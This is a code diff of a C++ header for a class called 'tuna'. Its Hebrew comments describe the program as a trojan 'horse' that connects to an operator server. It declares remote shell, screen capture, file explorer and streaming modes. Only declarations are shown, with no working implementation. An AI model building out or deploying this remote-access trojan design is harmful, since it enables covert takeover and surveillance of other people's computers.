@@ -9,29 +9,68 @@ class tuna : tuna_socket
 public: 
 	// init tuna
 	tuna();
-	// delete tuna
-	//~tuna();
+
+	// ---
 	// start point processes
+	// נקודת ההתחלה של הסוס אין חזור ממנו, במידה והתרחשה שגיאה שלא במסגרת
+	// האפשרויות הסוס מת
+	// ---
 	void run();
-	// processes and communication
+
+	// ---
+	// לאחר חיבור הסוס לשרת המפעיל (לא השרת הראשי) הסוס ימתין לחבילות מידע
+	// זה ראש העץ ממנו תהליכים כבדים יעלו 
+	// ---
 	void proto_communication();
-	// mode ping 
+
+	// ---
+	// חלק מניהול אוטומטי של הסוס 
+	// ---
 	void mode_ping();
-	// mode shell
+
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_shell(json info);
-	// mode shell 2
+	
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_shell_terminal(json info);
-	// mode screen
+	
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_screen(json info);
-	// mode explorer
+	
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_explorer(json info);
-	// mode streamer
+	
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_streamer(json info);
-	// mode scanner: not suppport here
+	
 	void del__mode_scanner();
-	// mode signal
+	
+	// ---
+	// מעטפת לפונקציה שפירטתי בקובץ
+	// modes.h
+	// ---
 	void mode_signal(json sig);
+	
+	// ---
+	// ניקוי כללי 
+	// deallocates reset setting and more
 	// 
+	// ---
 	void cleanup();
 
 private:
